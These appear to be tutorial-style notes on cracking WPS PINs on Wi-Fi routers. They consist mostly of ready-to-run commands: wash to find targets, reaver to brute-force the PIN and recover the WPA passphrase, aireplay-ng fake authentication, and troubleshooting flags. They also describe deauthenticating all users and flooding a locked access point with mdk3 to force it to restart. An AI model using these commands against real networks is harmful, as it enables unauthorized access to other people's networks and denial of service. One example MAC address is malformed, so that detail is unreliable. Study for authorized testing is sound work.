# WPS is a feature found in both WPA and WPA2
- allows client to connect without password
- authentication is done with an 8 digit number
- Only works if PBC (push button authentication) is not enabled
# How to crack WPS:
- wash --interface wlan0 or wash -i wlan0
   - Lck - Means if WPS is locked after a certain number of attempts
   - WPS - version of WPS
   - dBm - Signal strength
- If the target network is using OBC this attack will not work because it reuires you to physically push a button on the router
- Brute force the pin
   - reaver --bssid 00:1A:70:70:69:4B -channel 1 --interface wlan0 -vvv -no-associated
      - vvv will show us as much information as possible (for troubleshooting)
      - We do not want reaver to associate with the network. We will do this with aireplay-ng as that is more reliable
- aireplay-ng --fakeauth 30 -a 00:1A:70:70:69:4B -h 00:11:22:33:44:55:66 wlan0
   - 30 means we try to associated with the network every 30 seconds
   - -h = MAC address of our wireless adaptor
- After reaver cracks the pin. You will get the pin, the WPA passphrase and the name of the AP.

# Troubleshoot:
- If you get the message “Failed to associate with...”
   - you need to manually associate with aireplay-ng
      - aireplay-ng --fakeauth 100 -a 00:1A:70:70:69:4B -h 00:11:22:33:44:55:66 wlan0
         - 100 means to wait 100 seconds between association attempts
   - Then in another window run reaver again
      - reaver --bssid 00:1A:70:70:69:4B -channel 1 -i wlan0 -A -vvv
         - -A means do not associate with network
- If you get 0x3 & 0x4 errors (WPS transaction failed)
   - reaver --bssid 00:1A:70:70:69:4B -channel 1 -i wlan0 -A -vvv --no-nacks
- Detected AP rate limiting | WPS Locked
   - You can deauth all of the users and “hope” the user thinks something is wrong with router and it restarts it
   - You can wait until the router gets restarted by owner
   - Use MDK3 to remotely unlock locked routers
      - This will send many authentication frames to an AP. This will overwhelm the AP and cause it to restart
      - mdk3 wlan0 a -a 00:1A:70:70:69:4B -m 
         - a = attack mode, authentication dos
         - -a is the MAC of target network
         - -m is to create valid looking MAC addresses
      - wash -i wlan0
         - check if the router was unlocked


